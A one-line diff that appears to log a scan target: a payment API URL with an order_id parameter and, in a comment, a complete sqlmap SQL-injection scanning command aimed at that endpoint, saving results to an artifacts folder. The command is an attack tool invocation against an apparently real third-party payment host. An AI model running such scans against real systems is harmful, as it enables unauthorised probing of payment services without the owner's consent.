@@ -1,0 +1,1 @@
+https://pay-api.aghanim.com/ps/?order_id=ord_eLmCUiIhCDtqgAkD (GET)  # C:\Users\WINDOWS10\AppData\Local\Programs\Python\Python314\Scripts\sqlmap -u https://pay-api.aghanim.com/ps/?order_id=ord_eLmCUiIhCDtqgAkD --batch --level=1 --risk=1 --threads=1 --delay=1 --timeout=15 --output-dir=artifacts/sqlmap --flush-session
